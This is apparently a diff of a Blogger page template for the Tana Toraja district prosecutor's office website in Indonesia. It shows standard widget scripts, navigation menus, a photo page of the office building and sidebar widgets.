t!==document&&(e.event.add(document,n+"."+e.guid,function(){e.event.trigger(n,null,t,!0)}),e._data(this,n,e.guid++)),!1},teardown:function(){return this!==document&&e.event.remove(document,n+"."+e._data(this,n)),!1}}})}(jQuery,window);
+
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+function showrecentcomments(json){for(var i=0;i<a_rc;i++){var b_rc=json.feed.entry[i];var c_rc;if(i==json.feed.entry.length)break;for(var k=0;k<b_rc.link.length;k++){if(b_rc.link[k].rel=='alternate'){c_rc=b_rc.link[k].href;break;}}c_rc=c_rc.replace("#","#comment-");var d_rc=c_rc.split("#");d_rc=d_rc[0];var e_rc=d_rc.split("/");e_rc=e_rc[5];e_rc=e_rc.split(".html");e_rc=e_rc[0];var f_rc=e_rc.replace(/-/g," ");f_rc=f_rc.link(d_rc);var g_rc=b_rc.published.$t;var h_rc=g_rc.substring(0,4);var i_rc=g_rc.substring(5,7);var j_rc=g_rc.substring(8,10);var k_rc=new Array();k_rc[1]="Jan";k_rc[2]="Feb";k_rc[3]="Mar";k_rc[4]="Apr";k_rc[5]="May";k_rc[6]="Jun";k_rc[7]="Jul";k_rc[8]="Aug";k_rc[9]="Sep";k_rc[10]="Oct";k_rc[11]="Nov";k_rc[12]="Dec";if("content" in b_rc){var l_rc=b_rc.content.$t;}else if("summary" in b_rc){var l_rc=b_rc.summary.$t;}else var l_rc="";var re=/<\S[^>]*>/g;l_rc=l_rc.replace(re,"");if(m_rc==true)document.write('On '+k_rc[parseInt(i_rc,10)]+' '+j_rc+' ');document.write('<a href="'+c_rc+'">'+b_rc.author[0].name.$t+'</a> commented');if(n_rc==true)document.write(' on '+f_rc);document.write(': ');if(l_rc.length<o_rc){document.write('<i>&#8220;');document.write(l_rc);document.write('&#8221;</i><br/><br/>');}else{document.write('<i>&#8220;');l_rc=l_rc.substring(0,o_rc);var p_rc=l_rc.lastIndexOf(" ");l_rc=l_rc.substring(0,p_rc);document.write(l_rc+'&hellip;&#8221;</i>');document.write('<br/><br/>');}}}
+
+function rp(json){document.write('<ul>');for(var i=0;i<numposts;i++){document.write('<li>');var entry=json.feed.entry[i];var posttitle=entry.title.$t;var posturl;if(i==json.feed.entry.length)break;for(var k=0;k<entry.link.length;k++){if(entry.link[k].rel=='alternate'){posturl=entry.link[k].href;break}}posttitle=posttitle.link(posturl);var readmorelink="(more)";readmorelink=readmorelink.link(posturl);var postdate=entry.published.$t;var cdyear=postdate.substring(0,4);var cdmonth=postdate.substring(5,7);var cdday=postdate.substring(8,10);var monthnames=new Array();monthnames[1]="Jan";monthnames[2]="Feb";monthnames[3]="Mar";monthnames[4]="Apr";monthnames[5]="May";monthnames[6]="Jun";monthnames[7]="Jul";monthnames[8]="Aug";monthnames[9]="Sep";monthnames[10]="Oct";monthnames[11]="Nov";monthnames[12]="Dec";if("content"in entry){var postcontent=entry.content.$t}else if("summary"in entry){var postcontent=entry.summary.$t}else var postcontent="";var re=/<\S[^>]*>/g;postcontent=postcontent.replace(re,"");document.write(posttitle);if(showpostdate==true)document.write(' - '+monthnames[parseInt(cdmonth,10)]+' '+cdday);if(showpostsummary==true){if(postcontent.length<numchars){document.write(postcontent)}else{postcontent=postcontent.substring(0,numchars);var quoteEnd=postcontent.lastIndexOf(" ");postcontent=postcontent.substring(0,quoteEnd);document.write(postcontent+'...'+readmorelink)}}document.write('</li>')}document.write('</ul>')}
+
+//]]>
+</script>
+<script type='text/javascript'>
+summary_noimg = 400;
+summary_img = 300;
+img_thumb_height = 150;
+img_thumb_width = 200; 
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+function removeHtmlTag(strx,chop){ 
+	if(strx.indexOf("<")!=-1)
+	{
+		var s = strx.split("<"); 
+		for(var i=0;i<s.length;i++){ 
+			if(s[i].indexOf(">")!=-1){ 
+				s[i] = s[i].substring(s[i].indexOf(">")+1,s[i].length); 
+			} 
+		} 
+		strx =  s.join(""); 
+	}
+	chop = (chop < strx.length-1) ? chop : strx.length-2; 
+	while(strx.charAt(chop-1)!=' ' && strx.indexOf(' ',chop)!=-1) chop++; 
+	strx = strx.substring(0,chop-1); 
+	return strx+'...'; 
+}
+
+function createSummaryAndThumb(pID){
+	var div = document.getElementById(pID);
+	var imgtag = "";
+	var img = div.getElementsByTagName("img");
+	var summ = summary_noimg;
+	if(img.length>=1) {	
+		imgtag = '<img src="'+img[0].src+'" class="pbtthumbimg"/>';
+		summ = summary_img;
+	}
+	
+	var summary = imgtag + '<div>' + removeHtmlTag(div.innerHTML,summ) + '</div>';
+	div.innerHTML = summary;
+}
+
+//]]>
+</script>
+<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmJj3ZdI5JnqEzvSIo7zQqYkT9JVtcDoIWRdfnslF-i75wa2XQTSJDUwLo3r0w3S89XC8mQBAbuGFDj5fBq65AL3hgp3ZlM1qQ7O_FoDb4vBfnJ-264cujjugRlu30vtW6oD3fFuEaBgg/s1600/logokejaksaan.gif' property='og:image'/>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=2128310195421907157&amp;zx=3eb0d637-116c-45a3-aa74-68918499e740' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=2128310195421907157&amp;zx=3eb0d637-116c-45a3-aa74-68918499e740' rel='stylesheet'/></noscript>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+</head>
+<body id='wrappernbt'>
+<div id='top-navigation-wrappernbt'>
+<div class='top-navigationnbt'>
+<div class='menu-nbt-menu-container'>
+<ul class='menunbt' id='top-navnbt'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//'>Home</a></li>
+<li><a href='#'>Profil</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/doktrin-tugas-dan-wewenang-kejaksaan.html'>Doktrin, Tugas dan Wewenang Kejaksaan RI</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/visi-dan-misi.html'>Visi dan Misi</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/struktur-organisasi.html'>Struktur Organisasi</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perintah-harian-jaksa-agung-ri.html'>Perintah Harian Jaksa Agung RI</a></li>
+</ul>
+</li>
+<li><a href='#'>Organisasi</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/kepala-kejaksaan-negeri-mempunyaitugas.html'>Kepala Kejaksaan Negeri</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/intelijen.html'>Intelijen</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pembinaan.html'>Pembinaan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/tindak-pidana-khusus.html'>Tindak Pidana Khusus</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/tindak-pidana-umum.html'>Tindak Pidana Umum</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perdata-dan-tata-usaha-negara.html'>Perdata dan Tata Usaha Negara</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/formulir-pengembalian-barang-bukti.html'>Barang Bukti dan Barang Rampasan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pemeriksa.html'>Pemeriksa</a></li>
+</ul>
+</li>
+<li><a href='#'>Sarana</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html'>Gedung dan Halaman</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perpustakaan.html'>Perpustakaan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pos-pelayanan-hukum.html'>Pos Pelayanan Hukum Masyarakat</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/poliklinik_33.html'>Poliklinik</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/ikatan-adhyaksa-dharmakarini-iad_5.html'>Ikatan Adhyaksa Dharma Karini (IAD)</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/ruang-tahanan.html'>Ruang Tahanan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/kantin-kejujuran_5.html'>Kantin Adhyka</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/mushalla.html'>Musholla</a></li>
+</ul>
+</li>
+<li><a href='#'>Arsip</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Berita'>Berita</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Kegiatan'>Kegiatan</a></li>
+</ul>
+</li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/daftar-buronan_5.html'>Buronan</a></li>
+<li><a href='http://www.kejaksaan.go.id/produk_hukum.php?id_prod=1' target='_blank'>Produk Hukum</a></li>
+<li><a href='#'>Jadwal Sidang</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Pidum'>Sidang Pidum</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Pidsus'>Sidang Pidsus</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Datun'>Sidang Perdata</a></li>
+</ul>
+</li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/formulir-pengembalian-barang-bukti.html'>Barang Bukti</a></li>
+<li><a href='https://tilang.kejaksaan.go.id/' target='_blank'>Tilang</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/formulir-layanan-hukum.html' target='_blank'>Pelayanan Hukum</a></li>
+</ul>
+</div>
+</div>
+<div class='header-iconsnbt'>
+<a class='social-iconnbt facebook-iconnbt' href='#'><img alt='Facebook' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgB-C-EA7zODAJielfdXn6padQEhjHq6ZdScRe_tPm1smR23clAGdzd5lTdzMLeI6YeKdFCuZkIq4pzWs7q_NgKxW3E1f2bXFhIlmSt3Fir1RFaj7k078c0oQg0Y0Jb__fOsPmtE5eJYvh2/s1600/icon-facebook.png'/></a>
+<a class='social-iconnbt twitter-iconnbt' href='#'><img alt='Twitter' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizRJed7r4KPgPC1rTtmDXuEUMQx5yxROOZZSPKRG5xzKBYwwlzvWYxgXoJ6wm7_HO9BsUTS8KXjx3ShWlOWppcPQnyuX4ZxMt8xafJj-EyaGhn-88fczAFCuY5vW6NO1s6dnOlBfy5KSac/s1600/icon-twitter.png'/></a>
+<a class='social-iconnbt google-iconnbt' href='#'><img alt='Google +' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVtIx0N07SQYMkJgHzb1dWiPlks6FHC4Ny66nC3s4OM8kmdqd6qq2wzpjcnIEMHNFQ7EsoD8qBU1FOj9uOy6FtmrGa65hfDlpfFwo3avkTUgaJ2-jcM67dc6xRc66P4pg9WhFn099hUW7x/s1600/icon-google.png'/></a>
+<a class='social-iconnbt rss-iconnbt' href='#'><img alt='RSS' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjEPSb2fRSdjbP42qlP_dlC7j51ifHaY6fzMqar-WrKoGpAW-1SARsE2SA6kLuWmUWyh2EsqxNh01-RMnfcfmsZ95NT4I9o5HT_fKUZRkwkiW0VRRQp80dQ-PE1SH28EYHoN05aSEpO_WA/s1600/icon-rss.png'/></a>
+</div>
+</div>
+<div id='containernbt'>
+<header id='headernbt'>
+<div class='header-contentnbt'>
+<div class='headersec section' id='headersec'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='site-titlenbt'>
+<a href='https://kejari-tanatoraja.kejaksaan.go.id//'>KEJAKSAAN NEGERI TANA TORAJA</a>
+</h1>
+</div>
+<h2 class='site-descriptionnbt'>Satya Adhi Wicaksana</h2>
+</div>
+</div></div>
+<form action='/search' id='searchformnbt' method='get'>
+<div class='searchform-wrappernbt'>
+<input id='snbt' name='q' placeholder='Search here...' type='text' value=''/>
+<input alt='send' class='sendnbt' name='searchsubmitnbt' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnBHdfqgJUbiyMMDonsE_0KwFa87ieT0J5FMdkTKNq00yQ0kNKQxne47oEgked6-nDtaTRjyoIvKDcAVEcWnc-G5gif0TXdrDf7AiTILwHfVvy4Qa84Xty02aKCJev5YhTuxz15sezCHri/s1600/empty.gif' type='image'/>
+</div>
+</form>
+</div>
+</header>
+<!-- end of header -->
+<div id='main-contentnbt'>
+<div id='main-content-innernbt'>
+<div class='line-topnbt'></div>
+<div class='menu-boxnbt'>
+<div class='menu-nbt-menu-container'>
+<ul class='menunbt' id='navnbt'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//'>Home</a></li>
+<li><a href='#'>Profil</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/doktrin-tugas-dan-wewenang-kejaksaan.html'>Doktrin, Tugas dan Wewenang Kejaksaan RI</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/visi-dan-misi.html'>Visi dan Misi</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/struktur-organisasi.html'>Struktur Organisasi</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perintah-harian-jaksa-agung-ri.html'>Perintah Harian Jaksa Agung RI</a></li>
+</ul>
+</li>
+<li><a href='#'>Organisasi</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/kepala-kejaksaan-negeri-mempunyaitugas.html'>Kepala Kejaksaan Negeri</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/intelijen.html'>Intelijen</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pembinaan.html'>Pembinaan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/tindak-pidana-khusus.html'>Tindak Pidana Khusus</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/tindak-pidana-umum.html'>Tindak Pidana Umum</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perdata-dan-tata-usaha-negara.html'>Perdata dan Tata Usaha Negara</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/formulir-pengembalian-barang-bukti.html'>Barang Bukti dan Barang Rampasan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pemeriksa.html'>Pemeriksa</a></li>
+</ul>
+</li>
+<li><a href='#'>Sarana</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html'>Gedung dan Halaman</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/perpustakaan.html'>Perpustakaan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/pos-pelayanan-hukum.html'>Pos Pelayanan Hukum Masyarakat</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/poliklinik_33.html'>Poliklinik</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/ikatan-adhyaksa-dharmakarini-iad_5.html'>Ikatan Adhyaksa Dharma Karini (IAD)</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/ruang-tahanan.html'>Ruang Tahanan</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/kantin-kejujuran_5.html'>Kantin Adhyka</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/mushalla.html'>Musholla</a></li>
+</ul>
+</li>
+<li><a href='#'>Arsip</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Berita'>Berita</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Kegiatan'>Kegiatan</a></li>
+</ul>
+</li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//p/daftar-buronan_5.html'>Buronan</a></li>
+<li><a href='http://www.kejaksaan.go.id/produk_hukum.php?id_prod=1' target='_blank'>Produk Hukum</a></li>
+<li><a href='#'>Jadwal Sidang</a>
+<ul class='sub-menu'>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Pidum'>Sidang Pidum</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Pidsus'>Sidang Pidsus</a></li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Sidang Datun'>Sidang Perdata</a></li>
+</ul>
+</li>
+<li><a href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Barang Bukti'>Barang Bukti</a></li>
+<li><a href='https://tilang.kejaksaan.go.id/' target='_blank'>Tilang</a></li>
+<li><a href=''>YANKUM</a></li>
+</ul>
+</div>
+</div>
+<!-- Featured Image -->
+<div class='header-imagenbt'>
+<a href='#'><img src='http://i1382.photobucket.com/albums/ah247/Rendi_Alfianto/banner-kejari-tator2_zpswlpqu7sx.gif'/></a>
+</div>
+<!-- Featured Image End -->
+<div id='contentnbt'>
+<div class='home-latest-postsnbt'>
+<div class='mainblogsec section' id='mainblogsec'><div class='widget Image' data-version='1' id='Image4'>
+<div class='widget-content'>
+<a href='https://kejaksaan.go.id/pengaduan.php'>
+<img alt='' height='204' id='Image4_img' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiO0IhvKKknTt6DlXguJtlM1JlsYCdYNHsiQNz2q7zSdf_JzQPTQ5oL2LpeKPYDXIylndIfyc3_DtywiMXEfN-VV_WO3jwactII94wR4k4dJwL3RzmRyEIFKWEx8_L8lvys4cVNSgT0Ues/' width='512'/>
+</a>
+<br/>
+</div>
+<div class='clear'></div>
+</div><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+<!--Can't find substitution for tag [defaultAdStart]-->
+
+          <div class="date-outer">
+        
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<article class='post hentry post-entrynbt' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPNjSRYij9lw22Z3LTRBcRoslHx5Of4XbZSqc9ApVN2InG922ikCg7ZYo-h1wXyYmTKURKD_hBYsgjkemO0VZglpXgx2ZC7BHiZeZyoooj8OmEKfT9Kxb4FENNWz5RXef4WFpvvZOybIg/s320/oke1.jpg' itemprop='image'/>
+<a name='625444627383061687'></a>
+<h2 class='post-title entry-title post-entry-headlinenbt' itemprop='name'>
+<a href='https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html'>Gedung dan Halaman</a>
+</h2>
+<div class='post-header-line-1'></div>
+<div class='post-entry-content-wrappernbt'>
+<div class='post-body entry-content post-entry-contentnbt' id='post-body-625444627383061687' itemprop='articleBody'>
+<div style="text-align: center;">
+Foto Gedung dan Halaman Kejari Tana Toraja</div>
+<div style="text-align: center;">
+<br /></div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPNjSRYij9lw22Z3LTRBcRoslHx5Of4XbZSqc9ApVN2InG922ikCg7ZYo-h1wXyYmTKURKD_hBYsgjkemO0VZglpXgx2ZC7BHiZeZyoooj8OmEKfT9Kxb4FENNWz5RXef4WFpvvZOybIg/s1600/oke1.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="774" data-original-width="1032" height="240" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPNjSRYij9lw22Z3LTRBcRoslHx5Of4XbZSqc9ApVN2InG922ikCg7ZYo-h1wXyYmTKURKD_hBYsgjkemO0VZglpXgx2ZC7BHiZeZyoooj8OmEKfT9Kxb4FENNWz5RXef4WFpvvZOybIg/s320/oke1.jpg" width="320" /></a></div>
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5sxtZOjW4EgPA2OlmL3oKdMaQrgn4hEkyVpflJDvOo52rg6cO5vNcqZCXuWkBPBLc_Ms-18PTsUcFzTrjX1XSArkD01od_alpOM5zOJkiX2DedFk2O2zfisQprQjmzZv5oCyWJTkty2A/s1600/oke2.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="774" data-original-width="1032" height="240" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5sxtZOjW4EgPA2OlmL3oKdMaQrgn4hEkyVpflJDvOo52rg6cO5vNcqZCXuWkBPBLc_Ms-18PTsUcFzTrjX1XSArkD01od_alpOM5zOJkiX2DedFk2O2zfisQprQjmzZv5oCyWJTkty2A/s320/oke2.jpg" width="320" /></a></div>
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsBlzpEINoUYpDxKWktV_5wvrwHa38WV2ZLXP80-GXDYk6OQI7F55wsJPzjSNXnVpYzo0tW9mGqxbqqY2z9_nSsVdcW9K0v-uKbe0wZ8rVoTEmZViAhBRref8_a1SKvc6E9rft4NVXQQ0/s1600/oke3.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="774" data-original-width="1032" height="240" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsBlzpEINoUYpDxKWktV_5wvrwHa38WV2ZLXP80-GXDYk6OQI7F55wsJPzjSNXnVpYzo0tW9mGqxbqqY2z9_nSsVdcW9K0v-uKbe0wZ8rVoTEmZViAhBRref8_a1SKvc6E9rft4NVXQQ0/s320/oke3.jpg" width="320" /></a></div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgabI9l-DUbq1VS8qVhogAB232pMob436p5-V4mdFWxCQwM4WOizkDHvQcH06wMOkuzTRuBRPnfijNESRYotJ0IV9m_vuBYQBUQcuEEXER_CTBOK9f1O3asZ_cRS8hcK5H-dyEP_qBOVTY/s1600/IMG-20180524-WA0021.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="774" data-original-width="1032" height="240" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgabI9l-DUbq1VS8qVhogAB232pMob436p5-V4mdFWxCQwM4WOizkDHvQcH06wMOkuzTRuBRPnfijNESRYotJ0IV9m_vuBYQBUQcuEEXER_CTBOK9f1O3asZ_cRS8hcK5H-dyEP_qBOVTY/s320/IMG-20180524-WA0021.jpg" width="320" /></a></div>
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheKaIjrWn2ps743N6gJGdPBOl2FlAD0x0IrD2ZkNxzGjYQ8f5oDJIyLtQ5ZFaWQhltWUfJKlU53xAmkoTS0Q8t6459FEEhLS2C0tpA3iPa74mqJQFZtl0wRfpS2VwCR4yqTHct3nnCKh4/s1600/IMG-20180524-WA0022.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1032" data-original-width="774" height="320" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheKaIjrWn2ps743N6gJGdPBOl2FlAD0x0IrD2ZkNxzGjYQ8f5oDJIyLtQ5ZFaWQhltWUfJKlU53xAmkoTS0Q8t6459FEEhLS2C0tpA3iPa74mqJQFZtl0wRfpS2VwCR4yqTHct3nnCKh4/s320/IMG-20180524-WA0022.jpg" width="240" /></a></div>
+<div style="text-align: center;">
+<br /></div>
+<div style='clear: both;'></div>
+</div>
+</div>
+</article>
+<div style='clear: both;'></div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>
+0
+komentar:
+        
+</h4>
+<div id='Blog1_comments-block-wrapper'>
+<dl class='avatar-comment-indent' id='comments-block'>
+</dl>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<h4 id='comment-post-message'>Posting Komentar</h4>
+<p>
+</p>
+<a href='https://www.blogger.com/comment/frame/2128310195421907157?pa=625444627383061687&hl=id&saa=85391&origin=https://kejari-tanatoraja.kejaksaan.go.id/' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<!--Can't find substitution for tag [post.friendConnectJs]-->
+<script src='https://www.blogger.com/static/v1/jsbin/1212307205-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html', '0');
+    </script>
+</div>
+</p>
+<div id='backlinks-container'>
+<div id='Blog1_backlinks-container'>
+</div>
+</div>
+</div>
+</div>
+
+        </div></div>
+      
+<!--Can't find substitution for tag [adEnd]-->
+</div>
+<div style='clear: both;'></div>
+<div class='blog-pager' id='blog-pager'>
+<a class='home-link' href='https://kejari-tanatoraja.kejaksaan.go.id//'><i class='fa fa-home'></i></a>
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+</div><!-- end of content -->
+<div id='sidebarnbt'>
+<div class='sidebarrightnbt section' id='sidebarrightnbt'><div class='widget Image' data-version='1' id='Image3'>
+<h2>LAYANAN ASPIRASI &amp; PENGADUAN ONLINE RAKYAT</h2>
+<div class='widget-content'>
+<a href='https://www.lapor.go.id'>
+<img alt='LAYANAN ASPIRASI &amp; PENGADUAN ONLINE RAKYAT' height='137' id='Image3_img' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBdez1FzvU_o-ee8HOovOd_sZLN5xLKj0Vnh9cXDN3gvULHWo6uSBPksfqM6nSBtoDEPgf_A6Mwrw2sWX-6bRtelmN8dVY5oIMrvZmXWs1L8XdJTrADDXQgeTZqeJDpP3WKRCktrzNZQw/' width='300'/>
+</a>
+<br/>
+</div>
+<div class='clear'></div>
+</div><div class='widget Image' data-version='1' id='Image1'>
+<h2>Kepala KEJAKSAAN NEGERI TANA TORAJA</h2>
+<div class='widget-content'>
+<img alt='Kepala KEJAKSAAN NEGERI TANA TORAJA' height='368' id='Image1_img' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQyXdvvSokRwYUmTPuoH3B7KvmZKkcsxv831IBla8dzZNTfLWP7IDbowW868etZphT_knRdfwVf1Fqfb0GG4aJ0tzYe-dshYy8QQLQ37bpWwYZgmuA8G6wLPFiHg0FhyphenhyphenP9pn11TMfnqmc/s368/IMG-20210806-WA0007.jpg' width='191'/>
+<br/>
+<span class='caption'>ERIANTO LASO' PAUNDANAN, S.H., M.H.</span>
+</div>
+<div class='clear'></div>
+</div><div class='widget HTML' data-version='1' id='HTML2'>
+<h2 class='title'>Alamat KEJAKSAAN NEGERI TANA TORAJA</h2>
+<div class='widget-content'>
+<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d996.0002961334031!2d119.85451782916189!3d-3.0943429998591605!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zM8KwMDUnMzkuNiJTIDExOcKwNTEnMTguMiJF!5e0!3m2!1sid!2sid!4v1528273529423" width="300" height="200" frameborder="0" style="border:0" allowfullscreen></iframe>
+</div>
+<div class='clear'></div>
+</div><div class='widget Stats' data-version='1' id='Stats1'>
+<h2>Total Pengunjung</h2>
+<div class='widget-content'>
+<div id='Stats1_content' style='display: none;'>
+<span class='counter-wrapper graph-counter-wrapper' id='Stats1_totalCount'>
+</span>
+<div class='clear'></div>
+</div>
+</div>
+</div>
+<div class='widget BlogArchive' data-version='1' id='BlogArchive2'>
+<h2>Arsip Blog</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive2_ArchiveList'>
+<select id='BlogArchive2_ArchiveMenu'>
+<option value=''>Arsip Blog</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2024/05/'>Mei (4)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2024/03/'>Maret (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2023/10/'>Oktober (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2023/05/'>Mei (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2023/04/'>April (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2022/07/'>Juli (4)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2022/06/'>Juni (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2022/04/'>April (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2022/02/'>Februari (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/10/'>Oktober (4)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/09/'>September (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/07/'>Juli (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/06/'>Juni (4)</option>
